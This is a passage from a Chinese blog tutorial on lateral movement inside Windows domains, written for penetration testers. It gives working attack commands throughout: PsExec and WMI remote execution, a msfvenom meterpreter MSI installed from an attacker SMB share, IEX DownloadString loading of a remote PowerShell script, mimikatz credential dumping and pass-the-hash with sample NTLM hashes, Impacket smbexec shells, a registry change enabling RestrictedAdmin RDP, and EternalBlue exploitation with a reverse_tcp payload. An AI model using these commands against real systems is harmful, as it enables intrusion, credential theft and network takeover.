+<p>用域管理员用户的凭据连接远程主机(10.10.10.19)，并以SYSTEM权限启动一个交互式命令行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"><span class="comment"># -accepteula 禁止弹出许可证对话框    -u 指定远程主机的用户名            -p 指定用户的密码</span></span><br><span class="line"><span class="comment"># -S 以SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h5><blockquote>
+<p>WMI(Windows Management Instrumentation, <strong>Windows管理规范</strong>)是一项核心的Windows管理技术。用户可以通过WMI管理本地和远程计算机。Windows为远程传输WMI数据提供了两个可用的协议，即分布式组件对象模型(Distributed Component ObjectModel, <strong>DCOM</strong>)和Windows远程管理(Windows Remote Management, <strong>WinRM</strong>)，使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能够远程进行</p>
+</blockquote>
+<blockquote>
+<p>在横向移动时，测试人员可以利用WMI提供的管理功能，通过已获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法：                                                                                                              				   1.通过调用WMI的类方法进行远程执行，如Win32 Process类中的Create方法可以在远程主机上创建进程，Win32 Product类      中的Install方法可以在远程主机上安装恶意的MSI		 																													2.远程部署WMI事件订阅，在特定条的事件发生时触发攻击</p>
+</blockquote>
+<p>利用WMI进行横向移动需要具备以下条件：①远程主机的WMI服务为开启状态(默认开启)；②远程主机防火墙放行135端口(WMI管理的默认端口)</p>
+<h6 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h6><ol>
+<li><p>执行远程查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node: /user: /password: process list brief   <span class="comment">#查询远程主机的进程信息</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建远程进程</p>
+<p>无回显, 可以将结果重定向输出到一个文件中进行文件读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node: /user: /password: process create <span class="string">&quot;cmd.exe /c ipconfig &gt; result.txt&quot;</span>    <span class="comment">#远程主机上创建新进程</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>远程安装MSI文件</p>
+<p>通过调用Win32_Product.Install方法，可以控制远程主机安装恶意的MSI (Microsoft Installer)文件，从而获取其权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.92.130 LPORT=80 -f msi -o reverse_http_80.msi    <span class="comment">#使用Metaspolit生成msi恶意文件</span></span><br><span class="line"> </span><br><span class="line">python3 smbserver.py evilsmb <span class="built_in">pwd</span> -smb2support    </span><br><span class="line"><span class="comment"># 在一台测试人员可控的服务器上搭建SMB共享服务器，并将生成的MSI文件放入共享目录</span></span><br><span class="line"> </span><br><span class="line">wmic /node: /user: /password: product call install PackageLocation=<span class="string">&quot;\\\evilsmb\reverse_http_80.msi&quot;</span> </span><br><span class="line"><span class="comment">#在跳板机上执行,控制远程主机通过UC路径进行远程加载测试人员服务器的MSI文件并进行安装，成功获取远程主机的权限</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h6 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h6><ol>
+<li><p>Wmiexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py H0CKSR/Administrator:adminDC<span class="comment">#\@123@192.168.30.10  #从远程主机获取交互式的shell</span></span><br><span class="line">python3 wmiexec.py /:@</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>2.Invoke-WMICommand</p>
+<p>Invoke-WmiCommand.psl是PowerSploit项目中的一个脚本，可以通过PowerShell调用WMI来远程执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#远程加载Invoke-WmiCommand.ps1脚本</span></span><br><span class="line">IEX(New-object Net.Webclient).Downloadstring(<span class="string">&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;</span>)</span><br><span class="line"><span class="comment">#指定远程系统用户名</span></span><br><span class="line">SUser <span class="string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="line"><span class="comment">#指定用户的密码</span></span><br><span class="line"><span class="variable">$Password</span> ConvertTo-Securestring -String <span class="string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="comment">#将用户名和密码整合，以便导入Credential</span></span><br><span class="line"><span class="variable">$Cred</span> New-object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="variable">$User</span>,<span class="variable">$Password</span></span><br><span class="line"><span class="comment">#指定远程主机的IP和要执行的命令</span></span><br><span class="line"><span class="variable">$Remote</span> Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential <span class="variable">$Cred</span> -ComputerName <span class="string">&quot;10.10.10.19&quot;</span></span><br><span class="line"><span class="comment">#输出命令执行回显</span></span><br><span class="line"><span class="variable">$Remote</span>.PayloadOutput</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h6><p>测试人员可以使用WMI的功能在远程主机上部署永久事件订阅，并在特定事件发生时执行任意代码或系统命令。使用WMI事件消费类的ActiveScriptEventConsumer和CommandLineEventConsumer,.可以在远程主机上执行任何攻击载荷。该技术主要用来在目标系统上完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wh0Nsq/Sharp-WMIEvent">Sharp-WMIEvent</a></p>
+<h5 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h5><h6 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h6><ol>
+<li><p>COM(组件对象模型)</p>
+<p>COM由一组构造规范和组件对象组成。COM组件对象通过接口描述自身，组件提供的服务都通过接口公开。接口就是一组函数指针表。每个指针初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互(交互的不同对象可以跨进程和跨主机)</p>
+<blockquote>
+<p>CLSID</p>
+<p>在前面potato提权部分有说到寻找可用的COM对象，指定COM对象的方式就是指定COM对象的CLSID</p>
+<p>Windows中每个COM对象都由一个128位二进制标识符标识（GUID），当GUID用于标识COM对象的时候就称为CLSID（类标识符）；当GUID用于标识接口时称为IID（接口标识符）；一些CLSID还有<code>ProgID</code>方便记忆</p>
+</blockquote>
+</li>
+<li><p>DCOM(分布式组件对象模型)</p>
+<p>DCOM是基于COM的一系列概念和程序接口支持组件之间跨主机通信</p>
+<p>DCOM是COM的拓展, 允许应用程序实例化和访问远程主机上的COM对象的属性和方法</p>
+<p>DCOM通过RPC技术将COM的功能拓展到本地之外,因此远程主机上托管COM服务端的软件可以通过PRC技术向客户端公开其方法</p>
+</li>
+</ol>
+<h6 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h6><p>1.MMC20.Application </p>
+<p>2.ShellWindows</p>
+<p>3.ShellBrowserWindow</p>
+<h5 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h5><p>WinRM通过<code>WS-Management</code>协议(用于远程管理软硬件的web协议)使用5985端口实现远程连接, 在开启WinRM服务后防火墙会自动方向相关端口从而让远程主机对其进行远程管理(WinServer2008以上的服务器中WinRM才会自启动)。使用WinRM横移需要有远程主机的管理员凭据信息(账号密码)</p>
+<h6 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h6><p>Windows自带的远程管理命令行工具:</p>
+<ol>
+<li><p>Winrs</p>
+<p>Windows远程管理提供的客户端程序, 允许通过提供的用户凭据, 在运行WinRM的服务器上执行系统命令。要求通信双方都安装WinRM服务,使用<code>WS-Management</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -r:http://IP:Port -u:administrator -p:adminDC#@123 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Winrm.cmd</p>
+<p>Winrm.cmd允许WMI对象通过WinRM传输进行远程交互，在本地或远程计算机上枚举WMI对象实例或调用WMI类方法。例如，通过调用Win32 Process类中的Create方法来创建远程进程</p>
+<p>默认无法通过Winrm连接到目标系统</p>
+<ol>
+<li><p>传输为HTTPS或目标位于<code>TrustedHosts</code>列表中并且提供了显式凭据</p>
+</li>
+<li><p>使用winrm.cmd配置<code>TrustedHosts</code>(列表中的计算机可能未经过身份验证,相关设置方法通过<code>winrm help config</code>查看)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/client @&#123;TrustedHosts=<span class="string">&#x27;&#x27;</span>&#125;    <span class="comment">#将目标主机添加到TrustedHosts列表</span></span><br><span class="line">powershell -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;Set-Item WSMan:localhost\client\trustedhosts -value *&quot;</span>  <span class="comment">#通过powersehll将所有主机加入到TrustedHosts</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>实战中可以远程执行一个攻击载荷，这里尝试启动一个notepad.exe进程，命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=</span><br><span class="line"><span class="string">&quot;notepad.exe&quot;</span>&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h6 id="通过WinRM获取交互式会话"><a href="#通过WinRM获取交互式会话" class="headerlink" title="通过WinRM获取交互式会话"></a>通过WinRM获取交互式会话</h6><p>1.Powersehll下的利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$User</span> = <span class="string">&#x27;H0CKSR\Administrator&#x27;</span> <span class="comment">#指定远程系统用户名</span></span><br><span class="line"><span class="variable">$Password</span> = ConvertTo-SecureString -String <span class="string">&#x27;adminDC#@123&#x27;</span> -AsPlainText -Force <span class="comment">#指定用户密码</span></span><br><span class="line"><span class="variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="variable">$User</span>,<span class="variable">$Password</span>  <span class="comment">#将用户名和密码整合以便导入Credential</span></span><br><span class="line">New-PSSession -Name WinRM1 -ComputerName  -Credential <span class="variable">$Cred</span> -Port 5985</span><br><span class="line"><span class="comment"># -Name 指定创建的会话名称</span></span><br><span class="line"><span class="comment"># -ComputerName 指定要连接的主机IP或主机名</span></span><br><span class="line"><span class="comment"># -Credential 指定有权连接到直接的用户凭据</span></span><br><span class="line"><span class="comment"># -Port 指定WinRM工作端口</span></span><br></pre></td></tr></table></figure>
+
+<p>2.<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a></p>
+<p>基于WinRM Shell的渗透测试框架，用户只需要提供目标地址、用户名、密码或用户哈希即可进行攻击</p>
+<h5 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h5><blockquote>
+<p>哈希传递(Pass The Hash, <strong>PTH</strong>)是一种针对NTLM协议的攻击技术。在NTLM身份认证的第三步中生成Response时，客户端直接使用用户的NTLM哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在Windows系统中只使用用户哈希值对访问资源的用户进行身份认证<br>当测试人员获得有效的用户名和密码哈希值后，就能够使用该信息对远程主机进行身份认证，不需暴力破解获取明文密码即可获取该主机权限。该方法直接取代了窃取用户明文密码和暴力破解哈希值的需要，在内网渗透中十分经典</p>
+</blockquote>
+<h6 id="哈希传递攻击的利用"><a href="#哈希传递攻击的利用" class="headerlink" title="哈希传递攻击的利用"></a>哈希传递攻击的利用</h6><p>通过Mimikatz和Impacket项目中的常用工具来简单演示哈希传递攻击的利用方法。相关利用工具还有很多，如<a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>、<a target="_blank" rel="noopener" href="https://github.com/PowerShell/PowerShell">PowerShell</a>、<a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a>等，Metasploit框架下也内置了很多可以执行哈希传递攻击的模块</p>
+<ul>
+<li>利用Mimikatz进行PTH</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/zwshi/mimikatz2.1_trunk">Mimikatz</a>中内置了哈希传递功能，需要本地管理员权限<br>①将Mimikatz上传到跳板机并执行以下命令抓取用户的哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403231350015.png" alt="image-20230403231350015" style="zoom:67%;" />
+
+<p>②利用抓取到的域管理员的NTLM Hash进行哈希传递，在跳板机执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:Administrator /domain:hack-my.com</span></span><br><span class="line"><span class="string">/ntlm:570a9a65db8fba761c1008a51d4c95ab&quot;</span> <span class="built_in">exit</span></span><br><span class="line"><span class="comment">#  /user指定要传递的用户名              /domain指定当前所处域名或工作组名               /ntlm指定用户哈希</span></span><br></pre></td></tr></table></figure>
+
+<p>弹出一个新的命令行窗口，在新的命令行中具有域管理员权限，可以访问域控的CFS服务</p>
+<ul>
+<li>利用Impacket进行PTH</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">Impacket</a>项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有psexec.py、smbexec.py和wmiexec.py。在使用时，可以借助内网代理等技术对内网主机进行攻击。以smbexec.py为例，执行以下命令，通过进行哈希传递，获取远程主机10.10.10.19)的交互式命令行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/</span><br><span class="line">administrator@10.10.10.19</span><br><span class="line"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="line"># -hashes指定用户完整的哈希值，如果LM Hash被废弃，就将其指定为0或为空</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="利用哈希传递登录远程桌面"><a href="#利用哈希传递登录远程桌面" class="headerlink" title="利用哈希传递登录远程桌面"></a>利用哈希传递登录远程桌面</h6><p>条件:</p>
+<blockquote>
+<ol>
+<li>远程主机开启受限管理员模式</li>
+<li>用于远程桌面的用户位于远程主机的管理员组中(受限管理员模式只对管理员组用户有效,如果获取哈希的用户属于远程桌面用户组就无法进行哈希传递攻击)</li>
+<li>拿到远程主机上能够登录的用户的哈希</li>
+</ol>
+</blockquote>
+<p><code>WinServer2012 R2</code>开始采用新版RDP, 支持受限管理员模式, 在该模式下才可以使用哈希进行哈希传递登录而不需要输入密码(在<code>Win8.1</code>和<code>WinServer2012 R2</code>上默认开启)</p>
+<p>没有开启受限管理员的主机可以通过下面命令开启:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>查看主机受限模式开启状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin   #输出为0则已启动,为1则未启动</span><br></pre></td></tr></table></figure>
+
+<p>远程主机开启受限管理员模式的话就可以通过Mimikatz进行攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz.exe privilege::debug sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:9d4dc8ae92b6e52504cca4a930ca50ec <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>大致原理是，哈希传递成功后执行“mstsc.exe &#x2F;restrictedadmin”命令，以受限管理员模式运行远程桌面客户端，此时不需输入用户名密码即可成功登录远程桌面。注意受限管理员模式只对管理员组中的用户有效，如果获取到的用户属于远程桌面用户组，就无法通过哈希传递进行登录</p>
+<h6 id="EhernalBlue永恒之蓝"><a href="#EhernalBlue永恒之蓝" class="headerlink" title="EhernalBlue永恒之蓝"></a>EhernalBlue永恒之蓝</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010  #检测模块,用于检查是否存在漏洞</span><br><span class="line">set rhosts xx.xx.xx.xx/24</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br><span class="line"> </span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload payload/windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set rhosts xx.xx.xx.xx/24</span><br><span class="line">set lhost xx.xx.xx.xx/24</span><br><span class="line">set lport xxx</span><br></pre></td></tr></table></figure>
+
+<p>与EternalBlue类似的远程代码执行漏洞还有很多，如MS08-067、CVE-2019-0708等，在内网渗透中可广泛应用于横向移动</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(5)/">https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(5)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(4)/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网渗透体系建设——权限提升</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.1.</span> <span class="toc-text">横向移动中的文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text">通过网络共享</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">搭建SMB服务器</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.3.</span> <span class="toc-text">通过windows自带工具</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">创建计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">常规利用流程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text">UNC路径加载执行</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">利用系统服务</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">创建远程服务</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SCShell"><span class="toc-number">1.3.2.</span> <span class="toc-text">SCShell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UAC-Remote-Restrictions-%E8%BF%9C%E7%A8%8B%E9%99%90%E5%88%B6"><span class="toc-number">1.3.3.</span> <span class="toc-text">UAC Remote Restrictions(远程限制)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">远程桌面利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E7%A1%AE%E5%AE%9A%E5%92%8C%E5%BC%80%E5%90%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">远程桌面的确定和开启</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RDP-Hijacking"><span class="toc-number">1.4.2.</span> <span class="toc-text">RDP Hijacking</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SharpRDP"><span class="toc-number">1.4.3.</span> <span class="toc-text">SharpRDP</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PsExec-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">PsExec 远程控制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WMI%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">WMI的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.1.</span> <span class="toc-text">常规利用方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.2.</span> <span class="toc-text">常见利用工具</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.3.</span> <span class="toc-text">WMI事件订阅的利用</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DCOM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">DCOM的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#COM%E5%92%8CDCOM"><span class="toc-number">1.7.1.</span> <span class="toc-text">COM和DCOM</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87DCOM%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">通过DCOM横向移动</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WinRM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">WinRM的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87WinRM%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">1.8.1.</span> <span class="toc-text">通过WinRM执行远程命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%80%9A%E8%BF%87WinRM%E8%8E%B7%E5%8F%96%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.8.2.</span> <span class="toc-text">通过WinRM获取交互式会话</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.</span> <span class="toc-text">哈希传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.1.</span> <span class="toc-text">哈希传递攻击的利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 